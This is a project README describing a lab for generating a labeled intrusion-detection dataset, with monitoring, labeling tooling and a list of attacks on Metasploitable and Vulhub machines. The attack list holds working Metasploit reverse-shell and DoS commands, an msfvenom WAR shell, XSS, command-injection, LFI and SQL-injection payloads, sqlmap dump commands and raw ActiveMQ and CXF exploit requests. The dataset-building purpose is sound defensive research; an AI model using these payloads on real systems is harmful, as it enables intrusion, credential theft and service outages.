# General Info
This project is focused on creation of a Cybersecurity Attacks Dataset which can later be used for IDS/IPS systems, ML or any other relevant purpose.

The idea is to have an isolated environment with intentionally vulnerable VM's and volunteer attackers who will conduct the attacks. 

In the following sections there is information on the different aspects of this project, and all of that is for the purpose of constructing a Methodology for the entire process.

---
# Scenario

The scenario is having a controlled environment with vulnerable machines and attacker machines. 
#### Vulnerable Machines

Should have 7 of each.

- Metasploitable 2 VMs
	- Linux VMs
- Metasploitable 3 VMs
	- Windows VMs
- SecGen Custom VMs - Still testing if possible
- VulHub Docker Containers inside VMs
	- Recent vulnerabilities
	- Will deploy different combinations of containers inside VMs

The `Attacks` section is organized by type of vulnerable machine, providing detailed information on every vulnerability of each machine type.
#### Attacker Machines

Each attacker will be given a preconfigured Kali Linux VM inside the environment with all the tools and software needed. That adds up to 7 Kali Linux VMs.

---
# Monitoring

The `Monitoring` section provides information on the monitoring of the environment, including raw packer capture, NTP synchronization, logging, and NetFlow data collection.

##### RAW Packet Capture
- Still to be tested by Bidik's proposal - Waiting on it
##### NTP
- NTP Syncing will be done by configuring `ntp.finki.ukim.mk` as NTP server on all machines 
- For Linux based, in **systemd** 
	- `/etc/systemd/timesyncd.conf`
- *For older Linux distros, manual installation of NTP server*
- For Windows based, in **Windows Time Service (W32Time)**
##### Logs
- [VictoriaLogs](https://github.com/VictoriaMetrics/VictoriaLogs)
	- All the system logs are stored here
	- Pulling logs from the Kafka queue

- Log Agent on the machine
	- Collect logs from the machine and send them to Kafka
	- Possible agents:
		- [Grafana Promtail](https://grafana.com/grafana/dashboards/20881-promtail-monitoring-metrics-and-logs/)
		- [fluentbit](https://fluentbit.io/)

- [Kafka](https://kafka.apache.org/)
	- receiving and queuing logs from the log agent of each machine

- Deployment scheme:
		![Logs](img/Logs.drawio.png)
##### NetFlow

- [nprobe](https://www.ntop.org/products/netflow-probes/nprobe/) - NetFlow probe (on the firewall)

- [ntopng](https://www.ntop.org/products/traffic-analysis/ntopng/) - NetFlow web interface

- [kafka](https://kafka.apache.org/)
	- optional: receiving and queuing NetFlow packets from the NetFlow probe (nProbe on the firewall)

- Deployment scheme:
	![NetFlow](img/NetFlow.drawio.png)

---
# Attacks

The `Attacks` section explains each of the attacks that will be conducted by the attacker.
It is organized in subsections for each vulnerable machine type.
For each attack, we have: 
- `attack_name` - unique identifier of an attack
- `exploit_cve` - if present
- `target_port` and `protocol`
- detailed step-by-step instructions on how to conduct the attack
	- provided specific commands
	- provided variations of attacks that can be combined randomly
- provided instructions on what to run on attack start and attack end

After each conducted attack, we can have one of the 3 scenarios:
- **success** - exploited successfully
- **ran** - ran without errors but did not exploit (also used for scanning)
- **error** - tool errored / attack did not run properly

Here follows the attacks list.

---
## Metasploitable 2

note: More attacks will be added before the infrastructure is ready.

### 1. Unix R-Services Reverse Shell

**Name:** `ms2-rservices-revshell`  
**Target port:** 513 / TCP

```bash
attacklog start --name ms2-rservices-revshell --dst-ip <dst-ip> --dst-port 513
```

```bash
rlogin -l root <dst-ip>
```

```bash
attacklog end --status <success|ran|error>
```

---

### 2. UnrealIRCD Backdoor Reverse Shell

**Name:** `ms2-unrealircd-revshell`  
**Target port:** 6667 / TCP

```bash
attacklog start --name ms2-unrealircd-revshell --dst-ip <dst-ip> --dst-port 6667
```

```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST <dst-ip>
set RPORT 6667
set LHOST <your_ip>
set LPORT 4444
set payload cmd/unix/reverse
exploit
```

```bash
attacklog end --status <success|ran|error>
```

---

### 3. DVWA XSS Reflected

**Name:** `ms2-dvwa-xss-reflected`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms2-dvwa-xss-reflected --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA XSS (Reflected) page and inject into the input field:

**Low / Medium:**

```
<svg onload=alert('Example')>
```

**High:** same payload, same bypass.

```bash
attacklog end --status <success|ran|error>
```

---

### 4. DVWA XSS Stored

**Name:** `ms2-dvwa-xss-stored`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms2-dvwa-xss-stored --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA XSS (Stored) page.

**Low** - inject into message field:

```
<script>alert('example')</script>
```

**Medium** - expand the `Name` field's maxlength in browser DevTools, then inject into name:

```
<img src=x onerror=alert('example')>
```

**High:** not bypassable.

```bash
attacklog end --status <success|ran|error>
```

---

### 5. DVWA Command Injection

**Name:** `ms2-dvwa-cmdinject`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms2-dvwa-cmdinject --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA Command Execution page.

**Low:**

```
127.0.0.1 && whoami
```

**Medium:**

```
127.0.0.1 | whoami
```

```bash
attacklog end --status <success|ran|error>
```

---

### 6. DVWA File Inclusion (LFI)

**Name:** `ms2-dvwa-lfi`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms2-dvwa-lfi --dst-ip <dst-ip> --dst-port 80
```

**Low:**

```
http://<dst-ip>/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

```bash
attacklog end --status <success|ran|error>
```

---

### 7. DVWA SQL Injection (Manual)

**Name:** `ms2-dvwa-sqli-manual`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms2-dvwa-sqli-manual --dst-ip <dst-ip> --dst-port 80
```

Navigate to the DVWA SQL Injection page.

**Low:**

```
1' or 1 = '1
```

Dump column names:

```
'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
```

Dump credentials:

```
' UNION SELECT user, password FROM users#
```

**Medium:**

```
1 UNION SELECT user, password FROM users#
```

```bash
attacklog end --status <success|ran|error>
```

---

### 8. Mutillidae SQLMap

**Name:** `ms2-mutillidae-sqlmap`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms2-mutillidae-sqlmap --dst-ip <dst-ip> --dst-port 80
```

Run one or more of the following. Pick based on what traffic pattern is needed:

**Basic scan:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username,password --batch
```

**Boolean-based blind:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=B --batch --level=3
```

**Time-based blind:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=T --batch --level=3
```

**Error-based:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=E --batch --level=3
```

**UNION-based:**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --technique=U --batch --level=3 --union-cols=3-6
```

**Full dump (aggressive):**

```bash
sqlmap -u "http://<dst-ip>/mutillidae/index.php?page=user-info.php&username=test&password=test&user-info-php-submit-button=View+Account+Details" -p username --batch --dbs --tables --dump --level=5 --risk=3
```

```bash
attacklog end --status <success|ran|error>
```

---

## Metasploitable 3

note: More attacks will be added before the infrastructure is ready.
### 9. GlassFish Reverse Shell

**Name:** `ms3-glassfish-revshell`  
**Target port:** 4848 / TCP

```bash
attacklog start --name ms3-glassfish-revshell --dst-ip <dst-ip> --dst-port 4848
```

Generate the payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f war -o shell.war
```

Start a listener:

```
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

Upload via the GlassFish admin panel at `http://<dst-ip>:4848` (credentials: `admin / sploit`):

1. Left panel -> **Applications** -> **Deploy**
2. Browse and select `shell.war` -> **OK**

Trigger the shell:

```bash
curl http://<dst-ip>:8080/shell/
```

```bash
attacklog end --status <success|ran|error>
```

---

### 10. Jenkins Reverse Shell

**Name:** `ms3-jenkins-revshell`  
**Target port:** 8484 / TCP

```bash
attacklog start --name ms3-jenkins-revshell --dst-ip <dst-ip> --dst-port 8484
```

```
use exploit/multi/http/jenkins_script_console
set RHOSTS <dst-ip>
set RPORT 8484
set LHOST <your_ip>
set LPORT 4447
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGETURI /script
exploit
```

```bash
attacklog end --status <success|ran|error>
```

---

### 11. IIS HTTP Denial of Service (CVE-2015-1635)

**Name:** `ms3-iis-http-dos`  
**Target port:** 80 / TCP

```bash
attacklog start --name ms3-iis-http-dos --dst-ip <dst-ip> --dst-port 80
```

```
use auxiliary/dos/http/ms15_034_ulonglongadd
set RHOSTS <dst-ip>
set RPORT 80
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 12. IIS FTP Wordlist Login Attack

**Name:** `ms3-iis-ftp-wordlist`  
**Target port:** 21 / TCP

```bash
attacklog start --name ms3-iis-ftp-wordlist --dst-ip <dst-ip> --dst-port 21
```

```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <dst-ip>
set RPORT 21
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 13. ElasticSearch Reverse Shell (CVE-2014-3120)

**Name:** `ms3-elasticsearch-revshell`  
**Target port:** 9200 / TCP

```bash
attacklog start --name ms3-elasticsearch-revshell --dst-ip <dst-ip> --dst-port 9200
```

```
use exploit/multi/elasticsearch/script_mvel_rce
set RHOSTS <dst-ip>
set RPORT 9200
set LHOST <your_ip>
set LPORT 4444
set PAYLOAD java/meterpreter/reverse_tcp
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 14. SNMP Enumeration

**Name:** `ms3-snmp-enum`  
**Target port:** 161 / UDP

```bash
attacklog start --name ms3-snmp-enum --dst-ip <dst-ip> --dst-port 161 --protocol udp
```

```
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <dst-ip>
set RPORT 161
set COMMUNITY public
set VERSION 1
run
```

```bash
attacklog end --status <success|ran|error>
```

---

### 15. JMX Reverse Shell (CVE-2015-2342)

**Name:** `ms3-jmx-revshell`  
**Target port:** 1617 / TCP

```bash
attacklog start --name ms3-jmx-revshell --dst-ip <dst-ip> --dst-port 1617
```

```
use exploit/multi/misc/java_jmx_server
set RHOSTS <dst-ip>
set RPORT 1617
set LHOST <your_ip>
set LPORT 4444
set payload java/meterpreter/reverse_tcp
run
```

```bash
attacklog end --status <success|ran|error>
```

---
## SecGen

Still under testing phase.

---
## VulnHub

More attacks will be added before the infrastructure is ready.

https://github.com/vulhub/vulhub/tree/master/flask/ssti
https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11978
https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-11981
https://github.com/vulhub/vulhub/tree/master/1panel/CVE-2024-39907
https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2022-41678
###### Request:
```
GET /api/jolokia/list HTTP/1.1
Host: localhost:8161
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic YWRtaW46YWRtaW4=
sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Origin: http://localhost
```
command for method 1: `python3 poc.py -u admin -p admin http://localhost:8161`
command for method 2:  ```
```
python3 poc.py -u admin -p admin --exploit jfr http://localhost:8161
```

###### end

https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2026-34197
###### request:
```
POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Content-Type: application/json
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 220

{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://host.docker.internal/poc.xml)"]}
```
###### end

https://github.com/vulhub/vulhub/tree/master/airflow/CVE-2020-17526

###### in venv:
`pip3 install flask-unsign[wordlist]`

After generated session cookie, insert it in: inspect -> application -> Cookies -> session, then reload and you should be logged in as an admin
###### end

https://github.com/vulhub/vulhub/tree/master/aj-report/CNVD-2024-15077
https://github.com/vulhub/vulhub/tree/master/apache-cxf/CVE-2024-28752
###### request:
```
curl -X POST "http://your-ip:8080/test" \
  -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" \
  -H "Connection: close" \
  --data-binary $'------kkkkkk123123213\r
Content-Disposition: form-data; name="1"\r
\r
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <web:test>\r
         <arg0>\r
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:Include></count>\r
</arg0>\r
      </web:test>\r
   </soapenv:Body>\r
</soapenv:Envelope>\r
------kkkkkk123123213--\r
'
```
###### end
https://github.com/vulhub/vulhub/tree/master/apache-druid/CVE-2021-25646
https://github.com/vulhub/vulhub/tree/master/apisix/CVE-2020-13945

---
# Automatic Labeling

The `Automatic Labeling` section is dedicated to the process of automatic labeling of flows and raw packet captures after conducting the attacks.

For this purpose, a CLI tool called `attacklog` was created, used on attack start and attack end to store structured information about each attack attempt. The tool is written in pure Python with no external dependencies and is very easy to use.

Link to the tool: https://github.com/JovanSimonoski/attacklog

---

### Process

Each attacker runs `attacklog` (pre-installed and initialized on their Kali VM before the session begins) to bracket every attack with a start and end event. This produces one structured SQLite record per attack that is later joined against captured flows and packets during post-processing.

---

### What Each Record Captures

| Field | Description |
|---|---|
| `attack_id` | Unique UUID - auto-generated per attempt |
| `attacker_id` + `src_ip` | Set once at init, never re-entered. Format: `attacker_<number>` |
| `attack_name` | Canonical name matching the entry in the Attacks section |
| `attack_type` | Inferred automatically: `targeted`, `port_scan`, or `network_scan` |
| `dst_ip` | Single address, CIDR block, or IP range |
| `dst_port` | Single port, contiguous range, or comma-separated list |
| `protocol` | `tcp`, `udp`, or `icmp` |
| `t_start` / `t_end` | Millisecond-precision UTC timestamps from the system clock |
| `status` | `success`, `ran` (completed without exploiting), or `error` |
| `notes` | Optional free-text field for anomalies |

---

### Attack Types

The attack type is inferred automatically from the `--dst-ip` and `--dst-port` values at start - no manual input required.

| Type | dst-ip | dst-port |
|---|---|---|
| `targeted` | Single address | Single port |
| `port_scan` | Single address | Range or list |
| `network_scan` | CIDR or range | Any |

---

### Attacker Workflow (per attack)

1. Run `attacklog start` with the attack name, destination IP, port, and protocol
2. Execute the attack following the step-by-step instructions
3. Run `attacklog end` with the outcome status

**Important:** `attacklog` refuses to start a new attack if a previous one has no `t_end`. Always close the current attack before starting the next one.

---

### Setup

- Each attacker is provided with a preconfigured Kali VM
- NTP is synced to `ntp.finki.ukim.mk` on all machines (attacker and target) before any session begins - this is the single most important prerequisite for reliable timestamp joining
- `attacklog` is pre-installed and initialized on each Kali VM with the attacker's assigned `attacker_id` and static VPN IP (`src_ip`) or if we have preconfigured VM's - just IP
- Each attacker is assigned a static IP, making `src_ip` a reliable identifier in flow/packet matching

---

### Labeling Logic

The automatic labeling script joins the `attacklog` SQLite export against NetFlow records and raw packet captures using:
- `src_ip` + `dst_ip` + `dst_port` + `protocol` as the join key - source port is not recorded, it is recovered from the PCAP during joining
- `t_start` / `t_end` as the time window, with a ±1s tolerance for clock jitter

Any flow outside a matched window is labeled **benign**. This is safe given the isolated environment - no legitimate user traffic exists on the target services, and infrastructure traffic (NTP, Kafka, log shipping) operates on entirely different ports.

---

### Data Storage and Export

- Records are stored locally at `~/.attacklog/attacks.db` (SQLite)
- Exported via `attacklog export --format json` or `--format csv` at the end of each session and submitted for post-processing
- Kafka integration can be added later - to be discussed

---

### What is NOT Recorded (by design)

- **Callback / reverse shell sessions** (dst → src) - recoverable from PCAP if needed
- **CVE, tool, payload type** - defined in the attack instruction files, joined by `attack_name` during post-processing; no manual entry needed

---

### Tool Reference

**Initialization** - run once per machine at setup:
```bash
attacklog init --attacker-id attacker_<number> --src-ip <src_ip>
```

**Start an attack:**
```bash
# Targeted attack (single IP, single port)
attacklog start --name <attack_name> --dst-ip <dst-ip> --dst-port <port>

# Port scan (single IP, port range or list)
attacklog start --name <attack_name> --dst-ip <dst-ip> --dst-port 1-1024

# Network scan (IP range or CIDR)
attacklog start --name <attack_name> --dst-ip 10.10.10.0/24 --dst-port 22,80,443

# UDP protocol (default is tcp)
attacklog start --name <attack_name> --dst-ip <dst-ip> --dst-port <port> --protocol udp
```

**End an attack:**
```bash
attacklog end --status <success|ran|error>
attacklog end --status error --notes "Module failed to connect"
```

**List recorded attacks:**
```bash
attacklog list
attacklog list --limit 10
```

**Export attacks data:**
```bash
attacklog export --format json --output attacks.json
attacklog export --format csv --output attacks.csv
```

**Add to PATH** (run once after installation):
```bash
chmod +x attacklog.py
sudo mv attacklog.py /usr/local/bin/attacklog
```